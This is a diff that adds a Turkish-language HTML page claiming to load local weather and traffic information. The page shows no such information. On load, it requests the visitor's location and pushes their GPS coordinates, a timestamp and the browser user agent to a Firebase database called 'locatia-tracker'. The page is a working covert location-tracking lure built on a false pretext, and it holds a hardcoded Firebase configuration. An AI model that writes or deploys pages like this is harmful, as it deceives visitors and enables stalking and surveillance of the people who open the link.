@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <title>📡 Bölgenize Özel Bilgi</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f9f9f9; text-align: center; padding: 40px; color: #333; }
+    h2 { font-size: 20px; margin-bottom: 15px; }
+    #status { margin-top: 20px; font-size: 15px; color: #555; }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+</head>
+<body>
+  <h2>📡 Bölgenize özel hava durumu ve trafik bilgileri yükleniyor...</h2>
+  <p id="status">Lütfen konum iznine izin verin...</p>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyC6zrIlOD4-7dYGTqMYT7aPI1jj19P112PM",
+      authDomain: "locatia-tracker.firebaseapp.com",
+      databaseURL: "https://locatia-tracker-default-rtdb.europe-west1.firebasedatabase.app",
+      projectId: "locatia-tracker",
+      storageBucket: "locatia-tracker.appspot.com",
+      messagingSenderId: "547895294949",
+      appId: "1:547895294949:web:daebfbe0f3a8ac76538d0c"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function kaydetKonum(lat, lng) {
+      const payload = {
+        lat,
+        lng,
+        time: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      };
+      db.ref("gpsVeri").push(payload);
+    }
+
+    function baslat() {
+      if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            const lat = pos.coords.latitude;
+            const lng = pos.coords.longitude;
+            kaydetKonum(lat, lng);
+            document.getElementById("status").innerText = "✅ Konum başarıyla kaydedildi.";
+          },
+          (err) => {
+            document.getElementById("status").innerText = "❌ Konum alınamadı: " + err.message;
+          }
+        );
+      } else {
+        document.getElementById("status").innerText = "❌ Tarayıcınız konum desteği sunmuyor.";
+      }
+    }
+
+    window.onload = baslat;
+  </script>
+</body>
+</html>
